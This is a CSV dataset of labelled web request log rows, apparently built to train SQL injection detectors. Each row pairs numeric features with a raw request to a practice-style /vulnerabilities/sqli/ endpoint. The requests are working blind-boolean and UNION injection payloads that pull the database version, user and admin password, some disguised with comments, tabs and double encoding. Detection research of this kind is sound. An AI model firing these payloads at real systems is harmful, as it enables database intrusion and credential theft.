url_length,path_length,query_length,body_length,is_json_payload,json_depth,param_count_body,number_of_parameters,parameter_name_count,encoded_character_count,percent_encoded_count,single_quote_count,double_quote_count,semicolon_count,comma_count,parenthesis_count,dash_count,hash_count,asterisk_count,slash_count,equal_count,plus_count,whitespace_count,keyword_select,keyword_union,keyword_from,keyword_where,keyword_or,keyword_and,keyword_insert,keyword_update,keyword_delete,keyword_drop,keyword_alter,keyword_create,keyword_table,keyword_information_schema,keyword_sleep,keyword_benchmark,keyword_version,has_union_select,has_tautology,has_sql_comment,has_quote,has_subquery,has_information_schema,has_sleep,has_benchmark,has_if_function,has_case_when,has_exists,has_substring,has_ascii,has_length,has_database_function,has_version_function,has_system_variable,has_error_based_pattern,has_error_condition,nested_select_count,sql_function_count,comparison_count,logical_operator_count,method_get,method_post,status_code,is_error_response,response_size,response_time,ip_request_count,ip_unique_path_count,ip_unique_query_count,text,ip,timestamp,method,url,path,query,decoded_query,attack_type,label,label_source,request_hash
67,22,44,0,0,0,0,1,2,1,1,1,0,0,0,6,0,0,1,4,2,0,5,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,1,1,1,0,0,0,0,0,0,0,0,1,0,1,0,0,0,1,2,2,1,1,0,200,0,1586,1,13115,10,6928,id=1' AND LENGTH((SELECT version()))=24 /*,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1'+AND+LENGTH((SELECT+version()))=24+%2F*,/vulnerabilities/sqli/,id=1'+AND+LENGTH((SELECT+version()))=24+%2F*,id=1' AND LENGTH((SELECT version()))=24 /*,sqli_blind_boolean,1,existing_log_label,42975d87eb33c86214d34916deb59a15
22,22,0,49,0,0,1,0,0,0,0,1,0,0,0,6,0,0,1,4,2,0,6,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,1,1,0,0,0,0,1,2,2,1,0,1,200,0,3504,1,13115,10,6928,id=1' and LENGTH((SELECT database()))=35 /*,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli/,/vulnerabilities/sqli/,,,sqli_blind_boolean,1,existing_log_label,eff0efd5bd0f3db6baa850385ef2993a
103,22,80,0,0,0,0,0,0,15,15,1,0,0,0,6,0,0,1,4,2,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,0,1,0,200,0,1313,1,13115,10,6928,id=1'%20AND%20LENGTH((SELECT%20version()))=29%20/*,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2520AND%2520LENGTH%28%28SELECT%2520version%28%29%29%29%3D29%2520%2F%2A,/vulnerabilities/sqli/,id%3D1%27%2520AND%2520LENGTH%28%28SELECT%2520version%28%29%29%29%3D29%2520%2F%2A,id=1'%20AND%20LENGTH((SELECT%20version()))=29%20/*,sqli_blind_boolean,1,existing_log_label,0ce83bffe61cb6499037e2c4b707cf9f
172,22,149,0,0,0,0,0,0,24,24,5,0,1,2,4,3,0,0,3,3,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,3,0,1,0,200,0,4394,1,13115,10,6928,"id=1'%20anD%20SUBSTRING((SELECT%20password%20FROM%20users%20Where%20user='admin'),24,1)='a'%20;--%20-",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2520anD%2520SUBSTRING%28%28SELECT%2520password%2520FROM%2520users%2520Where%2520user%3D%27admin%27%29%2C24%2C1%29%3D%27a%27%2520%3B--%2520-,/vulnerabilities/sqli/,id%3D1%27%2520anD%2520SUBSTRING%28%28SELECT%2520password%2520FROM%2520users%2520Where%2520user%3D%27admin%27%29%2C24%2C1%29%3D%27a%27%2520%3B--%2520-,"id=1'%20anD%20SUBSTRING((SELECT%20password%20FROM%20users%20Where%20user='admin'),24,1)='a'%20;--%20-",sqli_blind_boolean,1,existing_log_label,02c4eb8d426910786ec8199aaf92de11
73,22,50,0,0,0,0,0,0,4,4,1,0,0,0,6,0,1,0,3,2,0,5,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,1,1,0,0,0,0,1,2,2,1,1,0,200,0,3569,1,13115,10,6928,id=1' AND LENGTH((SELECT database()))=42 #,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27+AND+LENGTH((SELECT+database()))%3D42+%23,/vulnerabilities/sqli/,id%3D1%27+AND+LENGTH((SELECT+database()))%3D42+%23,id=1' AND LENGTH((SELECT database()))=42 #,sqli_blind_boolean,1,existing_log_label,1288861d3c8cf1be5bb0cdbc69280901
10,10,0,52,0,0,1,0,0,0,0,1,0,0,2,8,0,1,0,1,2,0,6,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,1,0,1,200,0,2509,1,13115,10,6928,"id=1' anD ORD(MID((SELECT user()),12,1))=116 #",192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/login.php,/login.php,,,sqli_blind_boolean,1,existing_log_label,fe8d0b983d40ce1d4d0f4b043dc1b7a4
79,22,56,0,0,0,0,1,2,1,1,1,0,0,2,8,0,1,0,3,2,0,5,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,2,2,1,1,0,200,0,3408,1,13115,10,6928,"id=1' ANd ASCII(SUBSTRING((SELECT user()),20,1))=119 #",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1' ANd ASCII(SUBSTRING((SELECT user()),20,1))=119 %23",/vulnerabilities/sqli/,"id=1' ANd ASCII(SUBSTRING((SELECT user()),20,1))=119 %23","id=1' ANd ASCII(SUBSTRING((SELECT user()),20,1))=119 #",sqli_blind_boolean,1,existing_log_label,b09f9a9bb0c983f38e6f545db867b095
116,22,93,0,0,0,0,0,0,18,18,1,0,0,2,8,0,1,0,3,2,0,5,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,1,1,0,1,0,0,0,0,1,3,2,1,1,0,200,0,3317,1,13115,10,6928,"id=1'	AND	ASCII(SUBSTRING((SELECT	database()),28,1))=77	#",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%09AND%09ASCII%28SUBSTRING%28%28SELECT%09database%28%29%29%2C28%2C1%29%29%3D77%09%23,/vulnerabilities/sqli/,id%3D1%27%09AND%09ASCII%28SUBSTRING%28%28SELECT%09database%28%29%29%2C28%2C1%29%29%3D77%09%23,"id=1'	AND	ASCII(SUBSTRING((SELECT	database()),28,1))=77	#",sqli_blind_boolean,1,existing_log_label,c666c697f9260731311b537b2cc89442
109,22,86,0,0,0,0,1,2,0,0,3,0,0,2,6,2,0,0,3,3,0,9,1,0,1,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,1,1,0,0,0,0,0,0,1,2,3,1,1,0,200,0,3084,0,13115,10,6928,"id=1' and ASCII(SUBSTRING((SELECT password fRom users WHERE user='admin'),30,1))=78 --",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1' and ASCII(SUBSTRING((SELECT password fRom users WHERE user='admin'),30,1))=78 --",/vulnerabilities/sqli/,"id=1' and ASCII(SUBSTRING((SELECT password fRom users WHERE user='admin'),30,1))=78 --","id=1' and ASCII(SUBSTRING((SELECT password fRom users WHERE user='admin'),30,1))=78 --",sqli_blind_boolean,1,existing_log_label,81c7d57bf772eaa7aeebfd2503c0e37c
11,11,0,61,0,0,1,0,0,0,0,1,0,0,2,8,3,0,0,1,2,0,7,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,1,1,0,1,0,0,0,0,1,3,2,1,0,1,200,0,2483,1,13115,10,6928,"id=1'	and	ASCII(SUBSTRING((SELECT	database()),38,1))=119	--	-",192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/search.php,/search.php,,,sqli_blind_boolean,1,existing_log_label,d8083c58b2c186e8e4a484d625ec4863
66,22,43,0,0,0,0,1,2,0,0,1,0,0,0,4,0,0,2,4,1,0,7,1,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,1,1,0,200,0,1237,1,13115,10,6928,id=1' and (SELECT COUNT(*) FrOm users)>5 /*,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1' and (SELECT COUNT(*) FrOm users)>5 /*,/vulnerabilities/sqli/,id=1' and (SELECT COUNT(*) FrOm users)>5 /*,id=1' and (SELECT COUNT(*) FrOm users)>5 /*,sqli_blind_boolean,1,existing_log_label,90387e3715965e064c9be179fed84c1e
127,22,104,0,0,0,0,1,2,9,9,5,0,0,2,4,3,0,0,3,3,0,10,1,0,1,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,1,3,1,1,0,200,0,4084,1,13115,10,6928,"id=1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'),27,1)='admin' -- -",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1'%20AND%20SUBSTRING((SELECT%20password%20FROM%20users%20WHERE%20user='admin'),27,1)='admin'%20--%20-",/vulnerabilities/sqli/,"id=1'%20AND%20SUBSTRING((SELECT%20password%20FROM%20users%20WHERE%20user='admin'),27,1)='admin'%20--%20-","id=1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'),27,1)='admin' -- -",sqli_blind_boolean,1,existing_log_label,1ec3cb0ec8db84842dbd135b6cfc5209
98,22,75,0,0,0,0,0,0,15,15,3,0,0,2,6,0,0,1,4,2,0,5,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,2,1,1,0,200,0,2507,1,13115,10,6928,"id=1' AND MID((SELECT version()),42,1)='a' /*",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27+AND+MID%28%28SELECT+version%28%29%29%2C42%2C1%29%3D%27a%27+%2F%2A,/vulnerabilities/sqli/,id%3D1%27+AND+MID%28%28SELECT+version%28%29%29%2C42%2C1%29%3D%27a%27+%2F%2A,"id=1' AND MID((SELECT version()),42,1)='a' /*",sqli_blind_boolean,1,existing_log_label,440c4a1a16edee7e074ee4bbf7b63413
157,22,134,0,0,0,0,0,0,34,34,1,0,1,2,8,3,0,10,13,2,0,1,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,2,1,1,0,200,0,1962,1,13115,10,6928,"id=1'/**/AND/**/ORD(MID((SELECT/**/version()),3,1))=83/**/;--/**/-",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2F%2A%2A%2FAND%2F%2A%2A%2FORD%28MID%28%28SELECT%2F%2A%2A%2Fversion%28%29%29%2C3%2C1%29%29%3D83%2F%2A%2A%2F%3B--%2F%2A%2A%2F-,/vulnerabilities/sqli/,id%3D1%27%2F%2A%2A%2FAND%2F%2A%2A%2FORD%28MID%28%28SELECT%2F%2A%2A%2Fversion%28%29%29%2C3%2C1%29%29%3D83%2F%2A%2A%2F%3B--%2F%2A%2A%2F-,"id=1'/**/AND/**/ORD(MID((SELECT/**/version()),3,1))=83/**/;--/**/-",sqli_blind_boolean,1,existing_log_label,710d40fa391198a793fda08c86dee329
74,22,51,0,0,0,0,1,2,5,5,1,0,0,0,6,3,0,0,3,2,0,6,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,1,0,0,0,0,0,1,1,2,1,1,0,200,0,895,1,13115,10,6928,id=1' AND LENGTH((SELECT user()))=22 -- -,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1'%20AND%20LENGTH((SELECT%20user()))=22%20--%20-,/vulnerabilities/sqli/,id=1'%20AND%20LENGTH((SELECT%20user()))=22%20--%20-,id=1' AND LENGTH((SELECT user()))=22 -- -,sqli_blind_boolean,1,existing_log_label,f62a25b40213a00d5031a22af0364c7f
83,22,60,0,0,0,0,0,0,5,5,3,0,1,2,6,3,0,0,3,2,0,6,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,1,2,1,1,0,200,0,4108,1,13115,10,6928,"id=1' AND SUBSTRING((SELECT user()),1,1)='1' ;-- -",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27 AND SUBSTRING((SELECT user()),1,1)%3D%271%27 ;-- -",/vulnerabilities/sqli/,"id%3D1%27 AND SUBSTRING((SELECT user()),1,1)%3D%271%27 ;-- -","id=1' AND SUBSTRING((SELECT user()),1,1)='1' ;-- -",sqli_blind_boolean,1,existing_log_label,2bcaa4ee6ae1f8f0edadb3014f94058c
81,22,57,0,0,0,0,1,2,1,1,1,0,0,2,8,0,0,0,3,2,0,4,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,0,0,1,1,0,0,1,0,0,0,1,3,2,1,1,0,200,0,2331,1,13115,10,6928,"id=1' AND ASCII(SUBSTRING((SELECT version()),38,1))=92",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=1'+AND+ASCII(SUBSTRING((SELECT+version()),38,1))%3D92+#",/vulnerabilities/sqli/,"id=1'+AND+ASCII(SUBSTRING((SELECT+version()),38,1))%3D92+","id=1' AND ASCII(SUBSTRING((SELECT version()),38,1))=92 ",sqli_blind_boolean,1,existing_log_label,f00927ae6256ac330fbeba4bfcca627e
140,22,117,0,0,0,0,0,0,18,18,1,0,0,0,4,2,0,13,15,1,0,1,1,0,1,0,0,1,0,0,0,0,0,0,0,1,0,0,0,0,0,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,1,1,0,200,0,2240,1,13115,10,6928,id=1'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.tables)>4/**/--,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27%2F**%2FAND%2F%2A%2A/(SELECT%2F*%2A/COUNT(%2A)%2F**/FROM%2F%2A%2A/information_schema.tables)%3E4%2F*%2A%2F--,/vulnerabilities/sqli/,id%3D1%27%2F**%2FAND%2F%2A%2A/(SELECT%2F*%2A/COUNT(%2A)%2F**/FROM%2F%2A%2A/information_schema.tables)%3E4%2F*%2A%2F--,id=1'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.tables)>4/**/--,sqli_blind_boolean,1,existing_log_label,a1ab4f9334393159add74d66913c72ad
159,22,136,0,0,0,0,2,8,18,18,0,0,0,0,0,0,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,0,1,0,200,0,4417,1,13115,10,6928,id=id%3D1%27%2BAND%2BSUBSTRING%28%28SELECT%2Buser%28%29%29%2C42%2C1%29%3D%27c%27%2B%23&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%252BAND%252BSUBSTRING%2528%2528SELECT%252Buser%2528%2529%2529%252C42%252C1%2529%253D%2527c%2527%252B%2523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%252BAND%252BSUBSTRING%2528%2528SELECT%252Buser%2528%2529%2529%252C42%252C1%2529%253D%2527c%2527%252B%2523&Submit=Submit,id=id%3D1%27%2BAND%2BSUBSTRING%28%28SELECT%2Buser%28%29%29%2C42%2C1%29%3D%27c%27%2B%23&Submit=Submit,sqli_blind_boolean,1,existing_log_label,52d8e3b60928ac9453e6052b2d448cf1
74,22,51,0,0,0,0,1,2,4,4,1,0,0,0,6,0,0,1,4,2,0,5,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,1,1,0,0,0,0,1,2,2,1,1,0,200,0,1923,1,13115,10,6928,id=1' AND LENGTH((SELECT database()))=23 /*,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=1'%20AND%20LENGTH((SELECT%20database()))=23%20/*,/vulnerabilities/sqli/,id=1'%20AND%20LENGTH((SELECT%20database()))=23%20/*,id=1' AND LENGTH((SELECT database()))=23 /*,sqli_blind_boolean,1,existing_log_label,149bb102f7a838f280ea0c18e20c2bc9
152,22,129,0,0,0,0,2,8,18,18,0,0,0,0,0,3,0,0,3,2,5,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,1,1,0,200,0,1024,1,13115,10,6928,id=id%3D1%27+And+SUBSTRING%28%28SELECT+user%28%29%29%2C20%2C1%29%3D%27p%27+--+-&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%2BAnd%2BSUBSTRING%2528%2528SELECT%2Buser%2528%2529%2529%252C20%252C1%2529%253D%2527p%2527%2B--%2B-&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%2BAnd%2BSUBSTRING%2528%2528SELECT%2Buser%2528%2529%2529%252C20%252C1%2529%253D%2527p%2527%2B--%2B-&Submit=Submit,id=id%3D1%27+And+SUBSTRING%28%28SELECT+user%28%29%29%2C20%2C1%29%3D%27p%27+--+-&Submit=Submit,sqli_blind_boolean,1,existing_log_label,f5de59892d0fa25746ac6f713061c420
101,22,78,0,0,0,0,0,0,15,15,3,0,0,2,6,0,0,1,4,2,0,5,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,1,0,0,0,0,0,0,0,1,1,2,1,1,0,200,0,4038,1,13115,10,6928,"id=1' AND SUBSTRING((SELECT user()),39,1)='s' /*",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27+AND+SUBSTRING%28%28SELECT+user%28%29%29%2C39%2C1%29%3D%27s%27+%2F%2A,/vulnerabilities/sqli/,id%3D1%27+AND+SUBSTRING%28%28SELECT+user%28%29%29%2C39%2C1%29%3D%27s%27+%2F%2A,"id=1' AND SUBSTRING((SELECT user()),39,1)='s' /*",sqli_blind_boolean,1,existing_log_label,ce5a292618ea6a3b43c439539be8ecbe
172,22,149,0,0,0,0,2,8,19,19,0,0,0,0,0,0,0,0,3,2,8,1,0,0,1,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,1,1,0,200,0,3314,1,13115,10,6928,id=id%3D1%27+And+LENGTH%28%28SELECT+password+From+users+WHERE+user%3D%27admin%27%29%29%3D49+%2523&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%2BAnd%2BLENGTH%2528%2528SELECT%2Bpassword%2BFrom%2Busers%2BWHERE%2Buser%253D%2527admin%2527%2529%2529%253D49%2B%252523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%2BAnd%2BLENGTH%2528%2528SELECT%2Bpassword%2BFrom%2Busers%2BWHERE%2Buser%253D%2527admin%2527%2529%2529%253D49%2B%252523&Submit=Submit,id=id%3D1%27+And+LENGTH%28%28SELECT+password+From+users+WHERE+user%3D%27admin%27%29%29%3D49+%2523&Submit=Submit,sqli_blind_boolean,1,existing_log_label,dd4699d793e8aba6f9e02ec4ff66b045
11,11,0,75,0,0,1,0,0,0,0,1,0,0,2,8,0,1,8,9,2,0,2,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,2,1,0,1,200,0,2578,1,13115,10,6928,"id=1'/**/AND/**/ORD(MID((SELECT/**/version()),6,1))=78/**/#",192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/search.php,/search.php,,,sqli_blind_boolean,1,existing_log_label,62cbcf0a93bfdf10c6ffa556df9bf1e1
149,22,126,0,0,0,0,2,8,18,18,0,0,0,0,0,0,0,0,3,2,4,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,1,1,0,200,0,3706,1,13115,10,6928,id=id%3D1%27+AND+MID%28%28SELECT+database%28%29%29%2C23%2C1%29%3D%27p%27+%23&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%2BAND%2BMID%2528%2528SELECT%2Bdatabase%2528%2529%2529%252C23%252C1%2529%253D%2527p%2527%2B%2523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%2BAND%2BMID%2528%2528SELECT%2Bdatabase%2528%2529%2529%252C23%252C1%2529%253D%2527p%2527%2B%2523&Submit=Submit,id=id%3D1%27+AND+MID%28%28SELECT+database%28%29%29%2C23%2C1%29%3D%27p%27+%23&Submit=Submit,sqli_blind_boolean,1,existing_log_label,552c5e9df67f15065407dc07e6763920
72,22,49,0,0,0,0,0,0,4,4,1,0,0,0,6,0,1,0,3,2,0,5,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,1,1,1,0,0,0,0,0,0,0,0,1,0,1,0,0,0,1,2,2,1,1,0,200,0,3661,1,13115,10,6928,id=1' AND LENGTH((SELECT version()))=49 #,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id%3D1%27 AND+LENGTH((SELECT version()))%3D49+%23,/vulnerabilities/sqli/,id%3D1%27 AND+LENGTH((SELECT version()))%3D49+%23,id=1' AND LENGTH((SELECT version()))=49 #,sqli_blind_boolean,1,existing_log_label,38f7a447cc552598844fbe7787a786ea
83,22,59,0,0,0,0,1,51,2,2,1,0,0,2,8,0,0,0,3,2,0,4,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,1,0,0,0,1,1,0,0,0,0,0,0,1,1,0,0,1,0,0,0,1,3,2,1,1,0,200,0,1800,1,13115,10,6928,"id=1' AND ASCII(SUBSTRING((SELECT version()),41,1))=97",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27+AND ASCII(SUBSTRING((SELECT version()),41,1))=97+#",/vulnerabilities/sqli/,"id%3D1%27+AND ASCII(SUBSTRING((SELECT version()),41,1))=97+","id=1' AND ASCII(SUBSTRING((SELECT version()),41,1))=97 ",sqli_blind_boolean,1,existing_log_label,12a2e5a203b70b419af4ec9d78c4bf32
82,22,59,0,0,0,0,1,44,4,4,1,0,0,2,8,0,0,1,4,2,0,5,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,1,0,0,0,0,1,1,2,1,1,0,200,0,2310,1,13115,10,6928,"id=1' AND ORD(MID((SELECT database()),50,1))=120 /*",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1%27+AND ORD(MID((SELECT database()),50,1))=120+%2F%2A",/vulnerabilities/sqli/,"id%3D1%27+AND ORD(MID((SELECT database()),50,1))=120+%2F%2A","id=1' AND ORD(MID((SELECT database()),50,1))=120 /*",sqli_blind_boolean,1,existing_log_label,0242dca61ed7f3868178db924f1bb9a3
175,22,152,0,0,0,0,2,8,17,17,0,0,0,0,0,3,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,0,1,0,200,0,4237,1,13115,10,6928,id=id%3D1%27%2520UNION%2520SelEcT%2520user%28%29%2C%2520database%28%29%2C%2520version%28%29%2520--%2520-&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D1%2527%252520UNION%252520SelEcT%252520user%2528%2529%252C%252520database%2528%2529%252C%252520version%2528%2529%252520--%252520-&Submit=Submit,/vulnerabilities/sqli/,id=id%253D1%2527%252520UNION%252520SelEcT%252520user%2528%2529%252C%252520database%2528%2529%252C%252520version%2528%2529%252520--%252520-&Submit=Submit,id=id%3D1%27%2520UNION%2520SelEcT%2520user%28%29%2C%2520database%28%29%2C%2520version%28%29%2520--%2520-&Submit=Submit,sqli_union,1,existing_log_label,e3b3de43bbd967d4c96d6ddee106d547
72,22,49,0,0,0,0,0,0,2,2,1,0,0,1,0,0,1,0,3,1,0,7,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,3482,1,13115,10,6928,"id=1' UNION SELECT user,password FROM users #",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id%3D1'+UNION+SELECT+user,password+FROM+users+%23",/vulnerabilities/sqli/,"id%3D1'+UNION+SELECT+user,password+FROM+users+%23","id=1' UNION SELECT user,password FROM users #",sqli_union,1,existing_log_label,b89e806605066bdcf0434251dd32844a
113,22,90,0,0,0,0,2,8,8,8,0,0,0,0,0,0,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,2,0,1,0,200,0,3852,1,13115,10,6928,id=id%3D%27%2520UNIoN%2520seLECT%2520user%2Cpassword%2520%23&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=id%253D%2527%252520UNIoN%252520seLECT%252520user%252Cpassword%252520%2523&Submit=Submit,/vulnerabilities/sqli/,id=id%253D%2527%252520UNIoN%252520seLECT%252520user%252Cpassword%252520%2523&Submit=Submit,id=id%3D%27%2520UNIoN%2520seLECT%2520user%2Cpassword%2520%23&Submit=Submit,sqli_union,1,existing_log_label,1543bac664f82f561bf2b9896ab85a21
72,22,48,0,0,0,0,1,2,0,0,1,0,0,1,0,1,0,0,3,1,0,5,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,1,0,200,0,2178,1,13115,10,6928,"id=-1' union ALL SELECT table_name,table_schema",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,"/vulnerabilities/sqli/?id=-1' union ALL SELECT table_name,table_schema #",/vulnerabilities/sqli/,"id=-1' union ALL SELECT table_name,table_schema ","id=-1' union ALL SELECT table_name,table_schema ",sqli_union,1,existing_log_label,db7f4ccc905e30b88ed0dcd765a11c70
